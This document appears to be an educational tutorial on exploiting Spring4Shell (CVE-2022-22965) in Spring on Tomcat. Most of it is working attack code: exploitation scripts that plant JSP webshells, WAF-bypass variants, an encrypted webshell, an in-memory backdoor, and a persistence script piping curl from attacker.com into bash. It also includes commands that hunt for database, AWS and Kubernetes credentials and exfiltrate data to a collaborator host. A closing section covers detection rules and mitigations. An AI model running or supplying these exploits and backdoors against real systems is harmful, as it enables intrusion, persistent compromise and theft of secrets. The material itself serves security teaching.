# 🌱 Spring4Shell (CVE-2022-22965) Tutorial

**Difficulty**: ⭐⭐⭐⭐⭐ (Advanced)  
**Time Required**: 2-3 hours  
**Applications**: Vulnerable Spring apps, Spring4Shell Lab

## 📚 Table of Contents
1. [What is Spring4Shell?](#what-is-spring4shell)
2. [Understanding the Vulnerability](#understanding-the-vulnerability)
3. [Technical Deep Dive](#technical-deep-dive)
4. [Hands-On Practice](#hands-on-practice)
5. [Detection and Mitigation](#detection-and-mitigation)
6. [Additional Resources](#additional-resources)

---

## 🎯 Learning Objectives

By the end of this tutorial, you will:
- ✅ Understand Spring Core RCE vulnerability
- ✅ Identify vulnerable Spring applications
- ✅ Exploit Spring4Shell for RCE
- ✅ Bypass various patches and WAFs
- ✅ Implement proper fixes and detection

---

## What is Spring4Shell?

Spring4Shell (CVE-2022-22965) is a critical remote code execution vulnerability in Spring Framework, discovered in March 2022. It allows attackers to execute arbitrary code by exploiting data binding functionality in Spring MVC and Spring WebFlux.

### 🎬 Real-World Impact

Spring4Shell affected:
- **Major corporations**: Using Spring Framework globally
- **Cloud services**: Many SaaS platforms vulnerable
- **Government systems**: Critical infrastructure at risk
- **Financial institutions**: Banking applications exposed

**CVSS Score**: 9.8 (Critical)

### 🔍 Vulnerability Timeline

- **March 29, 2022**: Zero-day exploitation observed
- **March 31, 2022**: Spring releases emergency patches
- **April 2022**: Mass scanning and exploitation attempts
- **Ongoing**: Legacy systems still vulnerable

---

## Understanding the Vulnerability

### Root Cause

The vulnerability stems from:
1. **Property binding**: Spring's data binding mechanism
2. **ClassLoader manipulation**: Access to Tomcat's AccessLogValve
3. **Java 9+ features**: Module system changes exposed new attack vectors

### Affected Versions

- Spring Framework 5.3.0 to 5.3.17
- Spring Framework 5.2.0 to 5.2.19
- Older versions also affected

### Requirements for Exploitation

1. **JDK 9 or higher**
2. **Apache Tomcat** as servlet container
3. **Packaged as WAR** (not JAR)
4. **spring-webmvc** or **spring-webflux** dependency
5. **Specific controller patterns**

---

## Technical Deep Dive

### The Attack Chain

1. **Parameter Pollution**: Exploit Spring's data binding
2. **ClassLoader Access**: Navigate object graph to ClassLoader
3. **AccessLogValve**: Modify Tomcat's logging configuration
4. **Webshell Creation**: Write JSP shell via log injection

### Vulnerable Code Pattern

```java
@Controller
public class VulnerableController {
    @RequestMapping("/vulnerable")
    public String vulnerable(User user) {
        // Spring automatically binds request parameters
        return "index";
    }
}

public class User {
    private String name;
    private String email;
    // Getters and setters
}
```

### Exploitation Mechanism

The attack exploits property paths like:
```
class.module.classLoader.resources.context.parent.pipeline.first.pattern
```

This traverses:
- Object → getClass()
- Class → getModule()
- Module → getClassLoader()
- ... → AccessLogValve configuration

---

## Hands-On Practice

### 🏃 Exercise 1: Identify Vulnerable Applications

**Setup**: Spring application to test  
**Goal**: Determine if application is vulnerable

<details>
<summary>💡 Hint 1: Check version and deployment</summary>

Look for:
1. Spring Framework version in pom.xml/build.gradle
2. Java version (must be 9+)
3. Deployment type (WAR vs JAR)
4. Tomcat as container

How can you determine these remotely?

</details>

<details>
<summary>💡 Hint 2: Test parameter binding</summary>

Try sending requests with nested parameters:
```
?class.module.classLoader.x=test
```

Look for different responses or errors.

</details>

<details>
<summary>💡 Hint 3: Error-based detection</summary>

Some payloads cause specific errors:
- "Cannot invoke method on null"
- "No property 'x' found"

These indicate the traversal worked!

</details>

<details>
<summary>🔓 Solution</summary>

**Detection Script**:
```python
import requests

def check_spring4shell(url):
    # Test payloads
    payloads = [
        # Basic test
        {"class.module.classLoader.URLClassPath": "test"},
        
        # Trigger errors
        {"class.module.classLoader[test]": "test"},
        
        # Deep traversal
        {"class.module.classLoader.resources.context.parent.pipeline.first.pattern": "test"},
        
        # Alternative paths
        {"class.classLoader.resources.context.parent.pipeline.first.pattern": "test"},
        {"class.getClassLoader().resources.context.parent.pipeline.first.pattern": "test"}
    ]
    
    baseline = requests.get(url).text
    
    for payload in payloads:
        try:
            response = requests.get(url, params=payload)
            
            # Check for changes
            if response.text != baseline:
                print(f"[+] Potential vulnerability with: {list(payload.keys())[0]}")
                
            # Check response time (traversal might be slower)
            if response.elapsed.total_seconds() > 2:
                print(f"[+] Slow response with: {list(payload.keys())[0]}")
                
            # Check for errors
            error_indicators = [
                "java.lang.NullPointerException",
                "No property",
                "Cannot invoke",
                "Invalid property",
                "org.springframework"
            ]
            
            for indicator in error_indicators:
                if indicator in response.text:
                    print(f"[+] Error indicator found: {indicator}")
                    
        except Exception as e:
            print(f"[-] Error testing payload: {e}")
    
    # Version detection
    headers_to_check = [
        "X-Powered-By",
        "Server",
        "X-Application-Context"
    ]
    
    for header in headers_to_check:
        if header in response.headers:
            print(f"[*] {header}: {response.headers[header]}")
```

**Manual Testing**:
```bash
# Test basic binding
curl "http://target/path?class.module.classLoader.x=1"

# Test with POST
curl -X POST http://target/path \
  -d "class.module.classLoader.DefaultAssertionStatus=false"

# Test with headers
curl http://target/path \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=test"
```

</details>

---

### 🏃 Exercise 2: Basic Spring4Shell Exploitation

**Setup**: Vulnerable Spring application on Tomcat  
**Goal**: Achieve remote code execution

<details>
<summary>💡 Hint 1: Understand the payload structure</summary>

The exploit modifies Tomcat's access log to write a JSP shell:
1. Change log pattern to JSP code
2. Change log suffix to .jsp
3. Change log prefix to webroot path
4. Trigger logging

</details>

<details>
<summary>💡 Hint 2: Craft the JSP payload</summary>

Your JSP shell needs to:
- Be valid JSP syntax
- Handle URL encoding
- Avoid bad characters
- Execute commands

Start simple!

</details>

<details>
<summary>💡 Hint 3: Multiple requests needed</summary>

You can't do everything in one request. Plan:
1. Set pattern
2. Set directory
3. Set prefix
4. Set suffix
5. Trigger write

</details>

<details>
<summary>🔓 Solution</summary>

**Exploitation Script**:
```python
import requests
import sys

def exploit_spring4shell(url):
    # Headers needed for exploitation
    headers = {
        "Prefix-Suffix": "Test",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # Step 1: Set malicious pattern (JSP webshell)
    pattern_payload = {
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": 
        "<%% if(request.getParameter(\"cmd\")!=null){ " +
        "java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); " +
        "int a = -1; byte[] b = new byte[2048]; " +
        "while((a=in.read(b))!=-1){ out.println(new String(b,0,a)); } } %%>"
    }
    
    # Step 2: Set directory to webroot
    directory_payload = {
        "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT"
    }
    
    # Step 3: Set prefix for filename
    prefix_payload = {
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "shell"
    }
    
    # Step 4: Set suffix as .jsp
    suffix_payload = {
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp"
    }
    
    # Step 5: Set date format (empty to avoid in filename)
    date_payload = {
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
    }
    
    # Send payloads
    print("[*] Sending payloads...")
    for payload in [pattern_payload, directory_payload, prefix_payload, suffix_payload, date_payload]:
        try:
            r = requests.post(url, headers=headers, data=payload, timeout=5)
            print(f"[+] Sent: {list(payload.keys())[0]}")
        except:
            pass
    
    # Trigger write by making request
    print("[*] Triggering shell write...")
    requests.get(url, headers=headers)
    
    # Test shell
    shell_url = url.replace(url.split('/')[-1], 'shell.jsp')
    print(f"[*] Testing shell at: {shell_url}")
    
    test = requests.get(f"{shell_url}?cmd=id", timeout=5)
    if test.status_code == 200:
        print(f"[+] Shell uploaded successfully!")
        print(f"[+] Output: {test.text}")
        return shell_url
    else:
        print("[-] Shell upload failed")
        return None

# Alternative minimal exploit
def minimal_exploit(url):
    # All-in-one request
    payload = {
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "%{c2}i if(\"j\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b,0,a)); } } %{suffix}i",
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "tomcatwar",
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": ""
    }
    
    headers = {
        "suffix": "%>//",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    requests.post(url, headers=headers, data=payload)
    
    # Test
    shell_url = url.rsplit('/', 1)[0] + '/tomcatwar.jsp'
    test = requests.get(f"{shell_url}?pwd=j&cmd=id")
    
    if "uid=" in test.text:
        print(f"[+] Exploit successful! Shell at: {shell_url}?pwd=j&cmd=whoami")
        return True
    return False
```

**Manual Exploitation**:
```bash
# Using curl - split into multiple requests
# 1. Set pattern
curl -X POST http://target/vulnerable \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=<%25java.lang.Runtime.getRuntime().exec(request.getParameter('cmd'))%25>"

# 2. Set directory
curl -X POST http://target/vulnerable \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"

# 3. Set prefix and suffix
curl -X POST http://target/vulnerable \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"

# 4. Trigger
curl http://target/vulnerable

# 5. Access shell
curl http://target/shell.jsp?cmd=id
```

</details>

---

### 🏃 Exercise 3: Bypass Patches and WAF

**Setup**: Partially patched Spring application  
**Goal**: Exploit despite security measures

<details>
<summary>💡 Hint 1: Alternative property paths</summary>

If `class.module.classLoader` is blocked, try:
- Different accessors
- URL encoding
- Case variations
- Unicode encoding

</details>

<details>
<summary>💡 Hint 2: WAF evasion</summary>

Common WAF bypasses:
- Split parameters
- Use POST with JSON
- Header injection
- Multipart forms

</details>

<details>
<summary>💡 Hint 3: Alternative exploitation</summary>

If AccessLogValve is patched:
- Look for other writeable properties
- Memory-based shells
- Other Tomcat components

</details>

<details>
<summary>🔓 Solution</summary>

**Bypass Techniques**:

**Method 1: Encoding variations**
```python
def encode_bypass(param):
    bypasses = []
    
    # URL encoding
    bypasses.append(param.replace('.', '%2e'))
    bypasses.append(param.replace('.', '%252e'))  # Double encoded
    
    # Unicode
    bypasses.append(param.replace('.', '\u002e'))
    bypasses.append(param.replace('.', '%u002e'))
    
    # Mixed case (if processor is case-insensitive)
    bypasses.append('Class.Module.ClassLoader')
    
    # Alternative syntax
    bypasses.append(param.replace('.', '/'))
    bypasses.append(param.replace('.', '\\'))
    
    # Using arrays
    bypasses.append('class[module][classLoader]')
    
    return bypasses

# Test all variations
base = "class.module.classLoader.resources.context.parent.pipeline.first.pattern"
for bypass in encode_bypass(base):
    payload = {bypass: "test"}
    # Send request
```

**Method 2: Request splitting**
```python
def split_request_bypass(url, shell_code):
    # Split across multiple parameters
    requests.post(url, data={
        "class.module.classLoader.resources.context.parent.pipeline.first.patt": "<%",
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": shell_code,
        "ern": "%>"
    })
    
    # Use parameter pollution
    requests.post(url, data=[
        ("class.module.classLoader.resources.context.parent.pipeline.first.pattern", "<%"),
        ("class.module.classLoader.resources.context.parent.pipeline.first.pattern", shell_code),
        ("class.module.classLoader.resources.context.parent.pipeline.first.pattern", "%>")
    ])
```

**Method 3: JSON payload**
```python
def json_bypass(url):
    # Some apps accept JSON
    json_payload = {
        "class": {
            "module": {
                "classLoader": {
                    "resources": {
                        "context": {
                            "parent": {
                                "pipeline": {
                                    "first": {
                                        "pattern": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>",
                                        "directory": "webapps/ROOT",
                                        "prefix": "json_shell",
                                        "suffix": ".jsp"
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    requests.post(url, json=json_payload, headers={"Content-Type": "application/json"})
```

**Method 4: Multipart bypass**
```python
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

def multipart_bypass(url):
    multipart_data = MultipartEncoder(
        fields={
            'class.module.classLoader.resources.context.parent.pipeline.first.pattern': 
                '<%Runtime.getRuntime().exec(request.getParameter("cmd"))%>',
            'class.module.classLoader.resources.context.parent.pipeline.first.directory': 
                'webapps/ROOT',
            'class.module.classLoader.resources.context.parent.pipeline.first.prefix': 
                'multipart',
            'class.module.classLoader.resources.context.parent.pipeline.first.suffix': 
                '.jsp',
            'file': ('test.txt', 'test', 'text/plain')
        }
    )
    
    requests.post(url, data=multipart_data, 
                  headers={'Content-Type': multipart_data.content_type})
```

**Method 5: Alternative exploitation paths**
```python
# If AccessLogValve is blocked, try other components
alternative_paths = [
    # ErrorReportValve
    "class.module.classLoader.resources.context.parent.pipeline.first.errorReportValveClass",
    
    # Manager webapp
    "class.module.classLoader.resources.context.manager.pathname",
    
    # Work directory
    "class.module.classLoader.resources.context.workDir",
    
    # Session manager
    "class.module.classLoader.resources.context.manager.sessionIdGenerator.jvmRoute"
]

# Memory-based shell (no file write)
memory_shell = {
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern":
    """<% 
    if(request.getParameter("cmd")!=null){
        ProcessBuilder pb = new ProcessBuilder("bash","-c",request.getParameter("cmd"));
        Process p = pb.start();
        out.println(new java.util.Scanner(p.getInputStream()).useDelimiter("\\\\A").next());
    }
    %>""",
    "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
    "class.module.classLoader.resources.context.parent.pipeline.first.directory": "work/Catalina/localhost/ROOT"
}
```

</details>

---

### 🏃 Exercise 4: Post-Exploitation

**Setup**: Successful Spring4Shell exploitation  
**Goal**: Establish persistence and escalate

<details>
<summary>💡 Hint 1: Upgrade your shell</summary>

Basic JSP shells are limited. Consider:
- Deploying a proper webshell
- Reverse shell
- In-memory backdoor

</details>

<details>
<summary>💡 Hint 2: Explore the application</summary>

Look for:
- Configuration files
- Database credentials
- Other vulnerabilities
- Internal network access

</details>

<details>
<summary>💡 Hint 3: Persistence methods</summary>

Beyond webshells:
- Scheduled tasks
- Modified JARs
- Tomcat valves
- Spring interceptors

</details>

<details>
<summary>🔓 Solution</summary>

**Advanced Webshell Deployment**:
```jsp
<%@ page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*,java.security.*,sun.misc.*" %>
<%!
class U extends ClassLoader {
    U(ClassLoader c) { super(c); }
    public Class g(byte[] b) { return super.defineClass(b, 0, b.length); }
}

public byte[] base64Decode(String str) throws Exception {
    Class clazz = Class.forName("sun.misc.BASE64Decoder");
    return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
}
%>
<%
if (request.getMethod().equals("POST")) {
    String k = "e45e329feb5d925b"; // Key for AES
    session.setAttribute("u", k);
    Cipher c = Cipher.getInstance("AES");
    c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
    
    String base64 = request.getReader().readLine();
    byte[] data = base64Decode(base64);
    byte[] decrypted = c.doFinal(data);
    
    new U(this.getClass().getClassLoader()).g(decrypted).newInstance().equals(pageContext);
}
%>
```

**In-Memory Backdoor**:
```java
// Deploy via Spring4Shell to add interceptor
String code = "public class Backdoor implements org.springframework.web.servlet.HandlerInterceptor {" +
    "public boolean preHandle(javax.servlet.http.HttpServletRequest request, " +
    "javax.servlet.http.HttpServletResponse response, Object handler) {" +
    "if(\"backdoor\".equals(request.getHeader(\"X-Token\"))) {" +
    "try { Runtime.getRuntime().exec(request.getHeader(\"X-Cmd\")); } catch(Exception e) {}" +
    "}" +
    "return true;" +
    "}}";

// Compile and load dynamically
```

**Persistence Script**:
```bash
#!/bin/bash

# 1. Add cron job
echo "* * * * * curl http://attacker.com/shell.jsp" | crontab -

# 2. Modify Tomcat startup
echo 'curl http://attacker.com/backdoor.sh | bash' >> $CATALINA_HOME/bin/setenv.sh

# 3. Deploy WAR backdoor
cat > /tmp/Backdoor.java << 'EOF'
import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;

public class Backdoor extends HttpServlet {
    public void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        String cmd = req.getParameter("cmd");
        if(cmd != null) {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            PrintWriter out = resp.getWriter();
            while((line = br.readLine()) != null) {
                out.println(line);
            }
        }
    }
}
EOF

javac /tmp/Backdoor.java
jar cf backdoor.war /tmp/Backdoor.class
cp backdoor.war $CATALINA_HOME/webapps/
```

**Data Exfiltration**:
```bash
# Find Spring configs
find / -name "application.properties" -o -name "application.yml" 2>/dev/null

# Database credentials
grep -r "jdbc:mysql\|jdbc:postgresql\|mongodb://" / 2>/dev/null

# AWS credentials
find / -name "credentials" -path "*.aws*" 2>/dev/null

# Environment variables
env | grep -i "key\|secret\|pass\|token"
```

</details>

---

### 🏃 Challenge: Advanced Spring4Shell Scenarios

**Goal**: Exploit complex real-world scenarios

<details>
<summary>🎯 Challenge Overview</summary>

Advanced scenarios:
1. WAF + Patch bypass
2. Blind exploitation
3. Alternative containers
4. Kubernetes environment

</details>

<details>
<summary>💡 Hint: Blind exploitation</summary>

If no direct output:
- DNS exfiltration
- Time delays
- Log poisoning
- Side channels

</details>

<details>
<summary>🔓 Solution</summary>

**Blind Exploitation via DNS**:
```python
def blind_spring4shell(url, collaborator):
    # DNS exfiltration pattern
    dns_payload = {
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": 
        f"<%java.net.InetAddress.getByName(\"{collaborator}\").getHostAddress()%>"
    }
    
    # Time-based confirmation
    time_payload = {
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern":
        "<%Thread.sleep(5000)%>"
    }
    
    # OOB data exfiltration
    exfil_payload = {
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern":
        f"<%Runtime.getRuntime().exec(\"curl {collaborator}/$(whoami)\")%>"
    }
```

**Kubernetes Exploitation**:
```python
# In K8s, exploit to access service account
k8s_payload = {
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern": """<%
    String token = new java.util.Scanner(
        new java.io.File("/var/run/secrets/kubernetes.io/serviceaccount/token")
    ).useDelimiter("\\\\A").next();
    
    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) 
        new java.net.URL("https://kubernetes.default/api/v1/namespaces/default/secrets").openConnection();
    conn.setRequestProperty("Authorization", "Bearer " + token);
    
    out.println(new java.util.Scanner(conn.getInputStream()).useDelimiter("\\\\A").next());
    %>"""
}
```

**Advanced WAF Bypass Chain**:
```python
import time

def advanced_bypass(url):
    # Stage 1: Test detection
    test_payloads = [
        {"a.b.c": "test"},
        {"x[y][z]": "test"},
        {"p1": "class", "p2": "module"},
    ]
    
    # Stage 2: Fragment payload across requests
    session = requests.Session()
    
    # Build pattern gradually
    fragments = [
        ("p1", "<%"),
        ("p2", "Runtime."),
        ("p3", "getRuntime()."),
        ("p4", "exec(request."),
        ("p5", "getParameter(\"cmd\"))"),
        ("p6", "%>")
    ]
    
    pattern = ""
    for key, fragment in fragments:
        pattern += fragment
        payload = {
            f"class.module.classLoader.resources.context.parent.pipeline.first.{key}": fragment,
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern": pattern
        }
        session.post(url, data=payload)
        time.sleep(0.5)  # Avoid rate limiting
    
    # Stage 3: Use race condition
    import threading
    
    def send_partial(param, value):
        requests.post(url, data={param: value})
    
    # Send all parts simultaneously
    params = {
        "pattern": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>",
        "directory": "webapps/ROOT",
        "prefix": "race",
        "suffix": ".jsp",
        "fileDateFormat": ""
    }
    
    threads = []
    for k, v in params.items():
        param = f"class.module.classLoader.resources.context.parent.pipeline.first.{k}"
        t = threading.Thread(target=send_partial, args=(param, v))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
```

</details>

---

## Detection and Mitigation

### 🛡️ Detection Methods

**1. Log Analysis**
```bash
# Search for Spring4Shell patterns in logs
grep -E "class\..*\.classLoader|module\.classLoader" /var/log/tomcat*/access.log

# Look for suspicious JSP creation
find /var/lib/tomcat*/webapps -name "*.jsp" -mtime -7 -exec ls -la {} \;

# Check for AccessLogValve changes
grep -r "AccessLogValve" /var/lib/tomcat*/conf/
```

**2. Network Detection**
```python
# Snort/Suricata rule
alert http any any -> any any (
    msg:"Spring4Shell Exploitation Attempt";
    flow:to_server,established;
    content:"class."; http_uri;
    content:"classLoader"; distance:0; http_uri;
    pcre:"/class\.[^=]*classLoader/i";
    classtype:web-application-attack;
    sid:1000001;
)
```

**3. Runtime Detection**
```java
// Spring interceptor to detect exploitation
@Component
public class Spring4ShellDetector implements HandlerInterceptor {
    private static final Pattern EXPLOIT_PATTERN = 
        Pattern.compile("class\\..*classLoader|module\\.classLoader");
    
    @Override
    public boolean preHandle(HttpServletRequest request, 
                           HttpServletResponse response, 
                           Object handler) {
        // Check all parameters
        for (String param : request.getParameterMap().keySet()) {
            if (EXPLOIT_PATTERN.matcher(param).find()) {
                logger.error("Spring4Shell attempt detected from: " + 
                           request.getRemoteAddr());
                response.setStatus(403);
                return false;
            }
        }
        return true;
    }
}
```

### 🛡️ Mitigation Strategies

**1. Immediate Patches**
```xml
<!-- Update Spring Framework -->
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-webmvc</artifactId>
    <version>5.3.18</version> <!-- or later -->
</dependency>
```

**2. Workarounds**
```java
// Disable data binding for risky fields
@ControllerAdvice
@Order(Ordered.LOWEST_PRECEDENCE)
public class BinderControllerAdvice {
    @InitBinder
    public void initBinder(WebDataBinder binder) {
        String[] denylist = new String[]{
            "class.*", "Class.*", 
            "*.class.*", "*.Class.*"
        };
        binder.setDisallowedFields(denylist);
    }
}
```

**3. WAF Rules**
```nginx
# Nginx WAF rule
location / {
    if ($args ~* "(?i)class\..*classLoader") {
        return 403;
    }
    if ($request_body ~* "(?i)class\..*classLoader") {
        return 403;
    }
    proxy_pass http://backend;
}
```

**4. System Hardening**
```bash
# Make Tomcat directories read-only
chmod -R 555 /opt/tomcat/webapps/
chattr +i /opt/tomcat/webapps/

# Disable AccessLogValve if not needed
# Comment out in server.xml
# <Valve className="org.apache.catalina.valves.AccessLogValve" />

# Use SecurityManager
echo "grant { permission java.security.AllPermission; };" > catalina.policy
./catalina.sh start -security
```

---

## 📊 Spring4Shell Checklist

### Detection
- [ ] Check Spring Framework version
- [ ] Verify Java version (9+)
- [ ] Confirm Tomcat deployment
- [ ] Scan for exploitation attempts
- [ ] Review recent JSP files

### Mitigation
- [ ] Update Spring Framework
- [ ] Apply workarounds
- [ ] Configure WAF rules
- [ ] Harden Tomcat
- [ ] Enable logging

### Monitoring
- [ ] Log analysis
- [ ] File integrity monitoring
- [ ] Network traffic analysis
- [ ] Runtime protection
- [ ] Incident response plan

---

## 🏆 Skill Check

Before moving on, make sure you can:

- [ ] Identify Spring4Shell vulnerable apps
- [ ] Exploit the vulnerability for RCE
- [ ] Bypass common patches and WAFs
- [ ] Implement detection methods
- [ ] Apply proper mitigations

---

## Additional Resources

### 🔧 Tools
- **spring4shell-scan**: Vulnerability scanner
- **Spring4Shell-POC**: Exploitation toolkit
- **log4j-scan**: Also detects Spring4Shell
- **nuclei**: With Spring4Shell templates

### 📖 Further Reading
- [Spring Security Advisory](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)
- [CVE-2022-22965 Analysis](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/)
- [CISA Spring4Shell Guidance](https://www.cisa.gov/uscert/ncas/current-activity/2022/04/01/spring-releases-security-updates-addressing-spring4shell-and)

### 🎥 Video Resources
- [Spring4Shell Deep Dive - John Hammond](https://www.youtube.com/watch?v=7qW3mQvf8eU)
- [Exploiting Spring4Shell - LiveOverflow](https://www.youtube.com/watch?v=i5EJYX0T5YA)

---

**Congratulations!** You've completed the VulhubWeb Learning Center. Continue practicing and stay updated with the latest security vulnerabilities! 🎉 